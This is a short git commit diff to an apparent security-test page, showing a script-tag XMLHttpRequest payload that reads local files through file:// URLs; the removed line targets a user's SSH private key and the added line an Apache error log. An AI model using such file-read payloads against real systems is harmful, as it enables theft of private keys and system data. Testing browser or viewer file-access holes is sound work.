e790675080c7207238e920395daa6199ea9e38ed
abdelali khalfi <38424164+abdelalikhalfi@users.noreply.github.com>
2024-06-22 19:35:26 +0100

    Update test7.js

--- test6.js
+++ test6.js
@@ -5,6 +5,6 @@ function reqListener() {
 } 
 var oReq = new XMLHttpRequest(); 
 oReq.addEventListener("load", reqListener); 
-oReq.open("GET", "file:///wangl/.ssh/id_rsa"); 
+oReq.open("GET", "file:///var/log/apache2/error.log"); 
 oReq.send();
 </script>
